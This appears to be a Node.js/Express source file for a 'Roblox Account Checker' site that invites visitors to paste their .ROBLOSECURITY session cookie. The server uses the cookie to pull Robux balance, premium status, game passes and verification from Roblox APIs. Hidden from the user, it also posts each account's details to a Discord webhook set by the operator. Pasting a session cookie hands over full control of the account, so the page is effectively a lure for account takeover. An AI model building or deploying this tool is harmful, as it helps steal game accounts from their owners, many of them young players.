const express = require('express');
const app = express();

app.use(express.json());

// CORS – żeby frontend mógł wysyłać requesty (choć tu nie będzie potrzebne)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Strona główna – Twoja HTML
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Account Checker – .ROBLOSECURITY</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
    button:hover { background: #0c7ae6; }
    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 240px; line-height: 1.6; }
    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
  </style>
</head>
<body>
<h2>Roblox Account Info from .ROBLOSECURITY Cookie</h2>
<p style="color:#ffcc00; font-weight:bold;">
  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and can lead to permanent account ban.
</p>
<textarea id="cookie" placeholder="Paste the .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
<br>
<button onclick="checkAccount()">Check Account</button>
<div id="result"></div>

<script>
async function checkAccount() {
  const cookieVal = document.getElementById('cookie').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';
  if (cookieVal.length < 200) {
    result.innerHTML = '<span class="error">Cookie is too short or invalid</span>';
    return;
  }
  result.innerHTML = '<i>Checking account... please wait</i>';

  try {
    const resp = await fetch('/check', {           // <-- ZMIENIONE NA /check (lokalny endpoint)
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieVal })
    });
    const json = await resp.json();

    if (json.error) {
      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
      return;
    }

    if (json.success) {
      const creationDate = json.created !== 'failed to fetch'
        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
        : '—';
      let avatarHtml = json.avatarUrl
        ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">\`
        : '<p style="color:#ffcc00;">Could not load avatar</p>';
      const mm2Passes = [429957, 1308795];
      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
      const sabPasses = [1227013099, 1229510262, 1228591447];
      let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
      const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';

      result.innerHTML = \`
        <span class="success">Account verified successfully!</span><br><br>
        \${avatarHtml}
        <b>Username:</b> \${json.username}<br>
        <b>Display Name:</b> \${json.displayName}<br>
        <b>User ID:</b> \${json.userId}<br>
        <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
        <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
          \${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
        </span><br>
        <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('en-US')} Robux</span><br>
        <b>MM2 Gamepasses:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
        <b>AMP Gamepasses:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
        <b>SAB Gamepasses:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
        <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} days</span><br>
        <b>Created:</b> \${creationDate} \${json.created !== 'failed to fetch' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
      \`;
    }
  } catch (e) {
    result.innerHTML = \`<span class="error">Connection error: \${e.message}</span>\`;
  }
}
</script>
</body>
</html>`);
});

// Endpoint do sprawdzania konta (POST /check)
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};

  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    // Twój oryginalny kod sprawdzania konta – bez zmian
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');

    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) {
      throw new Error(userRes.status === 401 ? 'Invalid or expired cookie' : `API error: ${userRes.status}`);
    }
    const userData = await userRes.json();

    let emailVerified = false;
    try {
      const ownsRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
        {
          method: 'GET',
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json',
          },
        }
      );
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    res.status(200).json({
      success: true,
      username: userData.name,
      displayName: userData.displayName || userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      accountAgeDays,
      created: createdDate || 'failed to fetch',
      avatarUrl,
      hasGamePasses,
      emailVerified,
    });

    // Wysyłka do webhooka Discord
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: `Roblox Account – ${userData.name} (${userData.id})`,
              color: hasPremium ? 0x00ff9d : 0x5865F2,
              thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
              fields: [
                { name: "Username", value: userData.name, inline: true },
                { name: "Display Name", value: userData.displayName || userData.name, inline: true },
                { name: "Premium", value: hasPremium ? "Yes" : "No", inline: true },
                { name: "Robux", value: robux.toLocaleString(), inline: true },
                { name: "Age", value: `${accountAgeDays} days`, inline: true },
                { name: "Verified", value: emailVerified ? "Yes" : "No", inline: true },
                { name: "Gamepasses", value: hasGamePasses.length.toString(), inline: false },
              ],
              timestamp: new Date().toISOString(),
              footer: { text: "Railway • " + new Date().toLocaleString() }
            }]
          })
        });
      } catch (e) {
        console.error("Webhook failed:", e.message);
      }
    }

  } catch (err) {
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

// Uruchomienie serwera
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serwer działa na porcie ${PORT}`);
});
